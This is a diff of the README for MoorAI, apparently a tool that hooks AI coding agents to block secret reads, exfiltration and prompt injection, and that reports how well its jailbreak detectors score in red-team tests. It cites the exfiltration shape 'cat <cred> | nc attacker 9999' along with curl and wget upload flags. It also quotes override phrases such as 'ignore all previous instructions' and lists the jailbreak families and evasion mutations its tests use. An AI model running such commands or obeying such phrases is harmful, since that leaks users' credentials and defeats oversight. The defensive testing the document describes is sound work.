@@ -100,6 +100,48 @@ Now a `Read` of a `.env`, a secret in an MCP tool-call argument, or a call to an
 unapproved MCP server is blocked before it reaches the agent — content-free,
 fails open (governance, not a sandbox).
 
+**Which tools the hook actually sees.** `PRETOOL_MATCHERS` in
+[`cli/moorai-hook.mjs`](cli/moorai-hook.mjs) is the single source of truth, and it registers
+`Read` · `Bash` · `mcp__.*` · `Task` · `Write` · `Edit` · `MultiEdit` · `NotebookEdit` · `WebFetch`.
+The write family scans at the **`output`** stage, deliberately not `file`: the file stage pulls in the
+61-detector injection family, and an agent writing a doc that quotes *"ignore all previous instructions"*
+is a doc, not an attack. Existing installs converge on the current matcher list on ordinary invocations —
+only when MoorAI entries are already present, so nothing an operator uninstalled is ever re-added.
+
+`WebFetch` scans the URL and the prompt at the **`prompt`** stage. **The limit matters and is not
+incidental:** PreToolUse fires *before* the fetch, so the fetched page does not exist yet. Only the
+outbound request is scanned. **Inbound web content is not scanned and cannot be from this surface** — that
+needs a PostToolUse registration, which MoorAI does not have. `WebSearch`, `Glob` and `Grep` remain
+unregistered.
+
+**The context an agent auto-loads is screened too.** A detached worker runs the engine's `index` stage
+over the files the agent pulls in on its own — `CLAUDE.md`, `AGENTS.md`, `.mcp.json` and their siblings.
+On by default, off with `policy.indexScan: false`, and off the hot path so it cannot change a verdict.
+`.claude/skills/**` and `.claude/agents/*.md` are **not** in that ingest surface; they are covered by
+Skill Analysis on load, below.
+
+**Exfiltration shapes are read whole.** `extractReadPaths` used to `return []` on any command containing
+a pipe, redirect or subshell — so `cat <cred>` was denied on content (#39) while `cat <cred> | nc attacker
+9999`, the shape exfiltration actually takes, read nothing and could never fire. A quote-aware tokenizer
+now splits on `|`, `||`, `&&`, `;`, newlines and redirects, scans each segment, and recognises the upload
+forms (`@path`, `file=@path`, `--data-binary @path`, `--post-file=path`, `-T path`, `--upload-file path`).
+Genuine ambiguity still fails open — `$( )`, backticks, heredocs, unterminated quotes, `$VAR` — because
+fabricating a path is worse than missing one.
+
+**What a device with no policy stops.** Enrollment is the switch:
+
+- **Enrolled, no policy** — the built-in defaults apply. Previously the hook returned early on the
+  fail-open posture, `threatActionFor` was never consulted, and out-of-the-box prevention was measurably
+  **0%**. Resolution order is now `policy.threatPolicy` → `policy.tierPolicy` →
+  **`BUILTIN_DEFAULT_ACTIONS`** → the approval set → `notify`. `block`: **54** (reverse shell) and **65**
+  (local secret egress). `justify` (halt and ask): **55, 56, 57, 63, 44**. Every promotion had to fire on
+  **zero** benign samples across 890 benign prompts; threats 43, 39, 15, 2, 3, 40 and 50 did not clear
+  that bar and were deliberately left at their prior action.
+- **One documented exception** — on the **write path only**, threat 65 resolves to `justify`/ask rather
+  than `block`, because copying `.env` → `.env.local` is routine work and no benign corpus measures it.
+- **Unenrolled** — completely inert, unchanged, by design. An org policy still wins in both directions:
+  a tenant can soften any built-in default or harden a threat the map omits.
+
 ### Skill Analysis — what is your agent actually being told to do?
 
 No separate command: the analysis runs inside the same PreToolUse hooks. Whenever the agent loads a
@@ -202,7 +244,7 @@ npx moorai-aibom --format cyclonedx           # export the AI Bill of Materials 
 - **`moorai-receipt`** emits a signed, content-free **per-verdict decision receipt** — a strict-allowlist payload (tool · category · risk · decision · stage · tenant + the one-way hashes + chain seq/prev/chash), a SHA-256 digest bound only to those fields, and an ed25519 signature from the same per-device agency key as the MCP-approval tokens. `moorai-verify-chain --offline <file>` verifies a receipt (or an in-toto attestation) with **no network** — recomputing the digest to reject tampered payloads and checking the signature against a pinned key. Generation is fail-open (a null signer yields a valid unsigned receipt); verification is fail-closed.
 - **Per-agent behavioral baseline detectors.** On top of the fixed agent signatures, three content-free detectors flag deviation from an actor's *own* established behavior: a **velocity burst** (cadence far above the actor's robust median/IQR), a **confused-deputy pivot** (an injection tell followed by a sensitive action in the same actor's window), and a **fan-out anomaly** (a spawning actor delegating to abnormally many subagents). Features are all hashes/metadata; thresholds are chosen for explainability and not yet tuned against a production distribution.
 - **Obfuscation-resistant detection.** A bounded, DoS/ReDoS-capped decode/normalize pre-pass re-runs the detectors over decoded and reversed variants, so **encoded/obfuscated** payloads (base64/hex/rot13/caesar ciphers, reversed text, composed transforms) that defeat plain-text scanning are still caught. All ten HackAgent families — CipherChat, FlipAttack, h4rm3l, DAN, AutoDAN, BoN, AdvPrefix, and the persuasion/multi-turn families **PAP, PAIR, TAP** — are caught by content-free detectors, the last three via a weighted persuasion-tell + crescendo-trajectory analyzer (`data/crescendo.js`). **Measured honestly, and the honest answer depends heavily on how hard the test set is** — we publish both:
-  - **Mild paraphrases** (`npm run redteam-eval`, 29 held-out samples, 178-prompt benign corpus): **100% in-sample recall, 90% held-out recall, 93% precision.**
+  - **Mild paraphrases** (`npm run redteam-eval`, 29 held-out samples, 178-prompt benign corpus): **100% held-out (29/29) at 94% precision (4 FP/178).** Read that as a regression gate, not a generalization claim — a v0.71.0 tuning wave targeted these 29 samples, which burns them as a held-out set. The locked half below is the honest out-of-sample number.
   - **Adversarial mutations** (`node scripts/score-heldout-v2.mjs`, **105 fresh attacks** built by a mutation generator across 29 transformation axes — synonym/voice swaps, directive-in-code-comment/JSON/blockquote indirection, homoglyphs, letter-spacing, caesar/rot13, persona and persuasion recombinations). This set is split into a tune half and a **locked** test half (`scripts/split-heldout-v2.mjs`, stratified by family+axis); detector work may only see the tune half, so the locked half stays a valid measure:
 
     | | before fixes | after fixes |
@@ -211,7 +253,7 @@ npx moorai-aibom --format cyclonedx           # export the AI Bill of Materials 
     | **Locked test half, full stack** (+ on-device model) | — | **100% (44/44)** at **100% precision** |
     | Tune half | 34.4% (21/61) | 100% (61/61) |
 
-    Precision is measured against a **509-prompt benign corpus** (`test/redteam/benign-corpus-v2.json`, 168 adversarially-shaped hard negatives): **2.79% false-positive rate** (14/501). Ten hard-negative twin families — roleplay-persona, prefix-injection, urgency, hypothetical-framing, exfiltration-shape, unicode-obfuscation, legitimate-security among them — sit at **0% FP**.
+    Precision is measured against a **610-prompt benign corpus** (`test/redteam/benign-corpus-v2.json`, 269 adversarially-shaped hard negatives): **3.32% false-positive rate** (20/602). That rate went **up**, and the reason is the point: 101 deliberately-obfuscated benign samples were added, and before they existed the FP gate could not tell a safe detector apart from one scoring 48 false positives. A harder corpus with a worse number is a better measurement than an easy corpus with a good one.
 
   The original 33% was the real finding: **the detectors had been overfit to the phrasings they were tuned on.** Fixing four named root causes — a too-narrow policy-negation vocabulary, a rules-slot that broke on one adjective (`override your safety rules`), no confusable/homoglyph folding, and synonym-blind fuzzy matching — lifted the **locked** half from 31.8% to 70.5% with precision unchanged. The 8-point tune/test gap is the honest overfit margin. Still weakest: persuasion, thought-experiment and leetspeak axes (PAP/TAP remain near zero — they live in the semantic layer, not these detectors). None of this changes the fact that the **action layer** — which blocks the tool call regardless of whether the prompt was ever classified — is the durable control, not prompt detection. An optional **on-device semantic escalation** layer (`--semantic`, a local model, zero egress) recovers most of the residue (~97% held-out in a sampled run) but is opt-in and environment-dependent, so it is not the headline number. `npm run validate-blocking` shows every malicious *tool call* still denied at the hook even after a jailbreak.
 
@@ -237,10 +279,18 @@ decision. (Or set `otlpEndpoint` / `otlpHeaders` in the device config.)
 
 | | |
 |---|---|
-| **Agents** | Claude Code (full hook enforcement) · Codex / Copilot CLI (detection-only — no equivalent deny hook) |
-| **Surfaces** | prompts · AI outputs · files read into context · MCP tool calls · pasted images (on-device OCR) · RAG/index payloads · the agent's auto-loaded skill surface (skills, subagents, commands, MCP configs, hook-bearing settings) |
+| **Agents** | Claude Code (full hook enforcement) · Claude Desktop · Cursor · VS Code / Copilot · any project `.mcp.json` consumer (MCP stdio proxy — **enforcement, host-independently**, but only over MCP; see the bound below) · **Codex: not covered at all** — its config is TOML and our installer writes JSON |
+| **Surfaces** | prompts · AI outputs · files read into context · **files the agent writes or edits** · MCP tool calls · **MCP tool listings and tool results** · **outbound `WebFetch` requests** · pasted images (on-device OCR) · the agent's auto-loaded context files (`CLAUDE.md`, `AGENTS.md`, `.mcp.json`, …) · the agent's auto-loaded skill surface (skills, subagents, commands, MCP configs, hook-bearing settings) |
 | **Platforms** | macOS · Windows · Linux (on-device OCR is a second-class tier — see below) |
 | **Detects** | secrets · PII / PHI · source-code leakage · prompt injection · destructive commands · second-order/hidden-instruction injection · skill-surface poisoning & drift |
+
+**The bound on host-independent enforcement, stated plainly.** The MCP proxy enforces on any host that
+launches a stdio MCP server, in both directions — but MCP is one wire. Measured against a 12-action
+malicious set, the proxy refused **12/12** while enforcing (8 by the argument scan, **2 by the result
+scan**) and forwarded **4/4** benign actions — yet only **4 of those 12 actions natively traverse MCP at
+all**. The other eight reach the machine through a host's own built-in tools, where the Claude Code
+PreToolUse hook is the control and the proxy sees nothing. So "host-independent" is true of the mechanism
+and narrow in reach; full coverage is still a Claude Code property.
 
 ### Image inspection (#23) — where the OCR runs
 
